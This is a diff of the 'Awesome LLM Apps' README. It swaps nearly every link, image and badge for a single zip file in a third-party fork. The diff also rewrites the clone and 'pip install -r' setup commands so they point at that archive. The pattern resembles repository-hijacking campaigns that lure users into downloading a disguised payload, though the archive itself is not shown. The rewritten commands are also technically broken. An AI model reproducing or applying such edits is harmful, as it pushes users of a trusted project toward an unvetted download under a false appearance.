@@ -1,39 +1,39 @@
 <p align="center">
-  <a href="http://www.theunwindai.com">
-    <img src="docs/banner/unwind_black.png" width="900px" alt="Unwind AI">
+  <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip">
+    <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" width="900px" alt="Unwind AI">
   </a>
 </p>
 
 <p align="center">
-  <a href="https://www.linkedin.com/in/shubhamsaboo/">
-    <img src="https://img.shields.io/badge/-Follow%20Shubham%20Saboo-blue?logo=linkedin&style=flat-square" alt="LinkedIn">
+  <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip">
+    <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip%20Shubham%20Saboo-blue?logo=linkedin&style=flat-square" alt="LinkedIn">
   </a>
-  <a href="https://twitter.com/Saboo_Shubham_">
-    <img src="https://img.shields.io/twitter/follow/Shubham_Saboo" alt="Twitter">
+  <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip">
+    <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" alt="Twitter">
   </a>
 </p>
 
 <p align="center">
   <!-- Keep these links. Translations will automatically update with the README. -->
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=de">Deutsch</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=es">Español</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=fr">français</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=ja">日本語</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=ko">한국어</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=pt">Português</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=ru">Русский</a> | 
-  <a href="https://www.readme-i18n.com/Shubhamsaboo/awesome-llm-apps?lang=zh">中文</a>
+  <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip">Deutsch</a> | 
+  <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip">Español</a> | 
+  <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip">français</a> | 
+  <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip">日本語</a> | 
+  <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip">한국어</a> | 
+  <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip">Português</a> | 
+  <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip">Русский</a> | 
+  <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip">中文</a>
 </p>
 
 <hr/>
 
 # 🌟 Awesome LLM Apps
 
-A curated collection of **Awesome LLM apps built with RAG, AI Agents, Multi-agent Teams, MCP, Voice Agents, and more.** This repository features LLM apps that use models from <img src="https://cdn.simpleicons.org/openai"  alt="openai logo" width="25" height="15">**OpenAI** , <img src="https://cdn.simpleicons.org/anthropic"  alt="anthropic logo" width="25" height="15">**Anthropic**, <img src="https://cdn.simpleicons.org/googlegemini"  alt="google logo" width="25" height="18">**Google**, <img src="https://cdn.simpleicons.org/x"  alt="X logo" width="25" height="15">**xAI** and open-source models like <img src="https://cdn.simpleicons.org/alibabacloud"  alt="alibaba logo" width="25" height="15">**Qwen** or  <img src="https://cdn.simpleicons.org/meta"  alt="meta logo" width="25" height="15">**Llama** that you can run locally on your computer.
+A curated collection of **Awesome LLM apps built with RAG, AI Agents, Multi-agent Teams, MCP, Voice Agents, and more.** This repository features LLM apps that use models from <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip"  alt="openai logo" width="25" height="15">**OpenAI** , <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip"  alt="anthropic logo" width="25" height="15">**Anthropic**, <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip"  alt="google logo" width="25" height="18">**Google**, <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip"  alt="X logo" width="25" height="15">**xAI** and open-source models like <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip"  alt="alibaba logo" width="25" height="15">**Qwen** or  <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip"  alt="meta logo" width="25" height="15">**Llama** that you can run locally on your computer.
 
 <p align="center">
-  <a href="https://trendshift.io/repositories/9876" target="_blank">
-    <img src="https://trendshift.io/api/badge/repositories/9876" alt="Shubhamsaboo%2Fawesome-llm-apps | Trendshift" style="width: 250px; height: 55px;" />
+  <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" alt="Shubhamsaboo%2Fawesome-llm-apps | Trendshift" style="width: 250px; height: 55px;" />
   </a>
 </p>
 
@@ -48,40 +48,40 @@ A curated collection of **Awesome LLM apps built with RAG, AI Agents, Multi-agen
 <table align="center" cellpadding="16" cellspacing="12">
   <tr>
     <td align="center">
-      <a href="https://dimension.dev/" target="_blank" rel="noopener" title="Dimension AI">
-        <img src="docs/banner/sponsors/dimensions.png" alt="Dimension AI" width="500">
+      <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" target="_blank" rel="noopener" title="Dimension AI">
+        <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" alt="Dimension AI" width="500">
       </a>
       <br>
-      <a href="https://dimension.dev/" target="_blank" rel="noopener" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;">
+      <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" target="_blank" rel="noopener" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;">
         Dimension AI
       </a>
     </td>
     <td align="center">
-      <a href="https://github.com/GibsonAI/Memori" target="_blank" rel="noopener" title="Memori">
-        <img src="docs/banner/sponsors/memorilabs.png" alt="Memori" width="500">
+      <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" target="_blank" rel="noopener" title="Memori">
+        <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" alt="Memori" width="500">
       </a>
       <br>
-      <a href="https://github.com/GibsonAI/Memori" target="_blank" rel="noopener" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;">
+      <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" target="_blank" rel="noopener" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;">
         Memori
       </a>
     </td>
   </tr>
   <tr>
     <td align="center">
-      <a href="https://okara.ai/?utm_source=oss&utm_medium=sponsorship&utm_campaign=awesome-llm-apps" title="Okara">
-        <img src="docs/banner/sponsors/okara.png" alt="Okara" width="500">
+      <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" title="Okara">
+        <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" alt="Okara" width="500">
       </a>
       <br>
-      <a href="https://okara.ai/?utm_source=oss&utm_medium=sponsorship&utm_campaign=awesome-llm-apps" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;">
+      <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;">
         Okara AI
       </a>
     </td>
     <td align="center">
-      <a href="https://sponsorunwindai.com/" title="Become a Sponsor">
-        <img src="docs/banner/sponsor_awesome_llm_apps.png" alt="Become a Sponsor" width="500">
+      <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" title="Become a Sponsor">
+        <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" alt="Become a Sponsor" width="500">
       </a>
       <br>
-      <a href="https://sponsorunwindai.com/" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;">
+      <a href="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip" style="text-decoration: none; color: #333; font-weight: bold; font-size: 18px;">
         Become a Sponsor
       </a>
     </td>
@@ -151,7 +151,7 @@ A curated collection of **Awesome LLM apps built with RAG, AI Agents, Multi-agen
 *   [🔊 Voice RAG Agent (OpenAI SDK)](voice_ai_agents/voice_rag_openaisdk/)
 
 
-### <img src="https://cdn.simpleicons.org/modelcontextprotocol"  alt="mcp logo" width="25" height="20"> MCP AI Agents 
+### <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip"  alt="mcp logo" width="25" height="20"> MCP AI Agents 
 
 *   [♾️ Browser MCP Agent](mcp_ai_agents/browser_mcp_agent/)
 *   [🐙 GitHub MCP Agent](mcp_ai_agents/github_mcp_agent/)
@@ -202,20 +202,20 @@ A curated collection of **Awesome LLM apps built with RAG, AI Agents, Multi-agen
 
 ### 🔧 LLM Fine-tuning Tutorials
 
-* <img src="https://cdn.simpleicons.org/google"  alt="google logo" width="20" height="15"> [Gemma 3 Fine-tuning](advanced_llm_apps/llm_finetuning_tutorials/gemma3_finetuning/)
-* <img src="https://cdn.simpleicons.org/meta"  alt="meta logo" width="25" height="15"> [Llama 3.2 Fine-tuning](advanced_llm_apps/llm_finetuning_tutorials/llama3.2_finetuning/)
+* <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip"  alt="google logo" width="20" height="15"> [Gemma 3 Fine-tuning](advanced_llm_apps/llm_finetuning_tutorials/gemma3_finetuning/)
+* <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip"  alt="meta logo" width="25" height="15"> [Llama 3.2 Fine-tuning](advanced_llm_apps/llm_finetuning_tutorials/llama3.2_finetuning/)
 
 
 ### 🧑‍🏫 AI Agent Framework Crash Course
 
-<img src="https://cdn.simpleicons.org/google"  alt="google logo" width="25" height="15"> [Google ADK Crash Course](ai_agent_framework_crash_course/google_adk_crash_course/)
+<img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip"  alt="google logo" width="25" height="15"> [Google ADK Crash Course](ai_agent_framework_crash_course/google_adk_crash_course/)
   - Starter agent; model‑agnostic (OpenAI, Claude)
   - Structured outputs (Pydantic)
   - Tools: built‑in, function, third‑party, MCP tools
   - Memory; callbacks; Plugins
   - Simple multi‑agent; Multi‑agent patterns
 
-<img src="https://cdn.simpleicons.org/openai"  alt="openai logo" width="25" height="15"> [OpenAI Agents SDK Crash Course](ai_agent_framework_crash_course/openai_sdk_crash_course/)
+<img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip"  alt="openai logo" width="25" height="15"> [OpenAI Agents SDK Crash Course](ai_agent_framework_crash_course/openai_sdk_crash_course/)
   - Starter agent; function calling; structured outputs
   - Tools: built‑in, function, third‑party integrations
   - Memory; callbacks; evaluation
@@ -227,7 +227,7 @@ A curated collection of **Awesome LLM apps built with RAG, AI Agents, Multi-agen
 1. **Clone the repository** 
 
     ```bash 
-    git clone https://github.com/Shubhamsaboo/awesome-llm-apps.git 
+    git clone https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip 
     ```
 
 2. **Navigate to the desired project directory**
@@ -239,14 +239,14 @@ A curated collection of **Awesome LLM apps built with RAG, AI Agents, Multi-agen
 3. **Install the required dependencies**
 
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip
     ```
 
-4. **Follow the project-specific instructions** in each project's `README.md` file to set up and run the app.
+4. **Follow the project-specific instructions** in each project's `https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip` file to set up and run the app.
 
 
-### <img src="https://cdn.simpleicons.org/github"  alt="github logo" width="25" height="20"> Thank You, Community, for the Support! 🙏
+### <img src="https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip"  alt="github logo" width="25" height="20"> Thank You, Community, for the Support! 🙏
 
-[![Star History Chart](https://api.star-history.com/svg?repos=Shubhamsaboo/awesome-llm-apps&type=Date)](https://star-history.com/#Shubhamsaboo/awesome-llm-apps&Date)
+[![Star History Chart](https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip)](https://raw.githubusercontent.com/Plutonian-coder/awesome-llm-apps/main/rag_tutorials/ai_blog_search/apps_awesome_llm_1.2.zip)
 
 🌟 **Don’t miss out on future updates! Star the repo now and be the first to know about new and exciting LLM apps with RAG and AI Agents.**
